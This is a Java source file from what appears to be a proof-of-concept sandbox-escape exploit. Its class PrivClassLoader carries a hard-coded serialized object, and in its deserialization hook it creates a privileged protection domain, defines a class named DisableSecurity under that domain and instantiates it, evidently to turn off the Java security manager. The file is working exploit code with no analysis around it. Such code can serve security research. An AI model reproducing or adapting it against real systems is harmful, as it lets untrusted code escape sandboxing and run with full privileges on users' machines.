package poc.shared;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.security.ProtectionDomain;

public class PrivClassLoader extends ClassLoader implements Serializable {

	public static final byte[] SERIAL_DATA = {
		(byte)0x73, (byte)0x72, (byte)0x00, (byte)0x1E, (byte)0x65, (byte)0x78, 
		(byte)0x70, (byte)0x6C, (byte)0x6F, (byte)0x69, (byte)0x74, (byte)0x2E, 
		(byte)0x73, (byte)0x68, (byte)0x61, (byte)0x72, (byte)0x65, (byte)0x64, 
		(byte)0x2E, (byte)0x50, (byte)0x72, (byte)0x69, (byte)0x76, (byte)0x43, 
		(byte)0x6C, (byte)0x61, (byte)0x73, (byte)0x73, (byte)0x4C, (byte)0x6F, 
		(byte)0x61, (byte)0x64, (byte)0x65, (byte)0x72, (byte)0xF5, (byte)0x52, 
		(byte)0xF2, (byte)0xDC, (byte)0x18, (byte)0x45, (byte)0x38, (byte)0xB4, 
		(byte)0x02, (byte)0x00, (byte)0x00, (byte)0x78, (byte)0x70
	};
	
	private static final long serialVersionUID = -769285559213016908L;
	
	private void readObject( ObjectInputStream ois ) throws IOException, ClassNotFoundException {
		try {
			Utils.enter( "Load Privileged Class" );
			
			Utils.log( "Creating privileged ProtectionDomain." );
			ProtectionDomain pd = Utils.createPrivilegedDomain();
			
			Utils.log( "Reading in DisableSecurity.class" );
			byte[] clBytes = Utils.readClass( DisableSecurity.class );
			
			Utils.log( "Defining privileged class." );
			Class< ? > cl = this.defineClass( null, clBytes, 0, clBytes.length, pd );
			
			Utils.log( "Creating DisableSecurity instance." );
			cl.newInstance();
		}
		catch( Throwable t ) {
			t.printStackTrace();
		}
		finally {
			Utils.exit( );
		}
	}
}
